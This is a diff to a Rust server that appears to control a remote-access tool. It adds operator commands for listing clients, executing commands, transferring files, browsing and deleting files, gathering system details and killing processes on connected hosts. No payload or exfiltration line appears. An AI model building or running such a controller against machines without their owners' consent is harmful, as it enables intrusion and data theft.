@@ -3,7 +3,6 @@ use std::fs::File;
 use std::io::{BufRead, BufReader, Read, Write};
 use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4, TcpListener, TcpStream};
 use std::sync::{Arc, Mutex};
-use std::thread::{self};
 use std::fs::OpenOptions;
 use hostname;
 
@@ -73,15 +72,27 @@ fn check_input(parts: Vec<&str>, length_check: usize) -> bool {
 }
 
 /* Function to print the help message. */
-fn help() -> String {
-    
-    let help_string = format!("
-    Type 'clients' to list clients.
-    Type '<client id> upload <remote path> <localpath>' to upload a file.
-    Type '<client id> exec <command>' to send a command.
-    Type '<client id> download <remote path> <localpath>' to download a file.
+fn help() {
+
+    println!("
+        Type 'clients' to list clients.
+        Type '<client id> upload <remote path> <localpath>' to upload a file.
+        Type '<client id> exec <command>' to send a command.
+        Type '<client id> download <remote path> <localpath>' to download a file.
+        Type '<client id> pwd ' to get the current working directory.
+        Type '<client id> dir <path>' to list the contents of a directory.
+        Type '<client id> setcwd <path>' to set the current working directory.
+        Type '<client id> mkdir <path>' to create a directory.
+        Type '<client id> rmdir <path>' to remove a directory.
+        Type '<client id> rm <path>' to remove a file.
+        Type '<client id> cat <path>' to print the contents of a file.
+        Type '<client id> sysbasic' to get basic system information.
+        Type '<client id> sysdetails' to get detailed system information.
+        Type '<client id> proc' to list process information.
+        Type '<client id> kproc ProcessID' to kill a process.
+
     ");
-    help_string
+    
 
 
 }
@@ -175,8 +186,9 @@ fn handle_http_request(request_line: &str, clients: &Arc<Mutex<Vec<ClientInfo>>>
 
         "help" => {
                 
-            let help_string = help();
-            help_string
+            // call the help function.
+            help();
+            "".to_string()
         }
 
         // NOTE: Need to create a function for this and use string formatters to dynamically Create the output.
@@ -209,7 +221,7 @@ fn handle_http_request(request_line: &str, clients: &Arc<Mutex<Vec<ClientInfo>>>
         other => {
 
             // Return an error message.
-            format!("Command '{}' not implemented for immediate HTTP response.", other)
+            format!("Command '{}' ", other)
         
         }
     
@@ -459,7 +471,7 @@ fn main() {
             } else if current_line == "clients" {
 
                 // Debug.
-                println!("clients");
+                println!("clients a");
             
                 // Print the list of connected clients.
                 let lock = clients_for_commands.lock().unwrap();
@@ -749,9 +761,11 @@ fn main() {
 
                                      }
                                     
-                                    "exec" => {
-                                        
-                                        println!("Received from client {}: \"{}\"", client_id, message);
+                                    // Match muliple commands since they will have the same output format.
+                                    "exec" | "mkdir" | "dir" | "cat" | "rm" | "rmdir" | "pwd" | "setcwd" | "sysbasic" | "sysdetails" | "proc" | "kproc" => {
+
+                                        println!("{}", message);
+                                        println!("Received from client {}:", client_id);
 
 
                                      }
@@ -764,7 +778,7 @@ fn main() {
                                     }
 
 
-                                    "dir" => {
+                                    /*"dir" => {
                                         
                                         println!("{}", message);
 
@@ -781,7 +795,7 @@ fn main() {
 
                                         println!("{}", message);
 
-                                    }
+                                    }*/
 
                                     _ => {
                                         
